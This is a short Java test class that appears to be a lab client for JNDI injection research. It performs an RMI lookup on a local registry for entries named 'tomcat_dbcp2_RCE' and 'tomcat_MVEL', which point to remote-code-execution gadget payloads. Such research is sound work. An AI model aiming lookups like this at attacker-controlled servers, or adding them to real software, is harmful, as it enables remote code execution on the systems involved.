package com.rmi;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class RMITest {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext =  new InitialContext();
        Object lookup = initialContext.lookup("rmi://127.0.0.1:1099/tomcat_dbcp2_RCE");
//        Object lookup = initialContext.lookup("rmi://127.0.0.1:1099/tomcat_MVEL");

        System.out.println(lookup);
    }
}
